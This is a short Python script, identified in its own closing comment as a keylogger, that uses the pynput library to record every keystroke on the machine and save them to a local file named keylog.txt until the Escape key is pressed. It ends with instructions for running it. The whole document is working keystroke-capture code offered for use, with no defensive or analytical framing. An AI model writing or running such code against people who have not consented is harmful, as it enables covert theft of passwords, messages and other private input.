# Importing necessary modules
from pynput.keyboard import Key, Listener

# List to store keystrokes
key_log = []

# Function to execute on key press
def on_key_press(key):
    # Adding pressed key to the list
    key_log.append(key)
    # Writing keystrokes to a file
    write_keys_to_file(key_log)

# Function to write keys to a log file
def write_keys_to_file(keys):
    # Opening file in write mode
    with open('keylog.txt', 'w') as file:
        # Looping through keys and writing them to file
        for key_item in keys:
            # Converting key to string and removing quotes
            key_item = str(key_item).replace("'", "")
            file.write(key_item)

# Function to handle key release
def on_key_release(key):
    # Stopping the keylogger when 'Esc' key is pressed
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# To run this keylogger, execute the command:
# python keylogger.py

